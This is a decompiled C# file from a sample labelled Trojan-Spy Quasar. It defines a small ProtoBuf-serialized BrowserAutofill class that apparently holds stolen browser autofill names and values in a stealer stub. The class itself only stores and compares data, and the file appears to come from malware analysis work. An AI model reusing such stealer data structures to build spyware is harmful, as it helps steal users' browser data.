// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.Common.BrowserAutofill
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using ProtoBuf;
using System.Collections.Generic;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Common
{
  [ProtoContract(Name = "BrowserAutofill")]
  public class BrowserAutofill : INotifyPropertyChanged, IEqualityComparer<BrowserAutofill>
  {
    private string _name;
    private string _value;

    [ProtoMember(1, Name = "Name")]
    public string Name
    {
      get => this._name;
      set
      {
        this._name = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Name)));
      }
    }

    [ProtoMember(2, Name = "Value")]
    public string Value
    {
      get => this._value;
      set
      {
        this._value = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Value)));
      }
    }

    public event PropertyChangedEventHandler PropertyChanged;

    public bool Equals(BrowserAutofill x, BrowserAutofill y) => x.Name == y.Name && x.Value == y.Value;

    public int GetHashCode(BrowserAutofill obj)
    {
      int hashCode = 37 * 397;
      if (!string.IsNullOrEmpty(obj.Name))
        hashCode += obj.Name.GetHashCode();
      if (!string.IsNullOrEmpty(obj.Value))
        hashCode += obj.Value.GetHashCode();
      return hashCode;
    }
  }
}
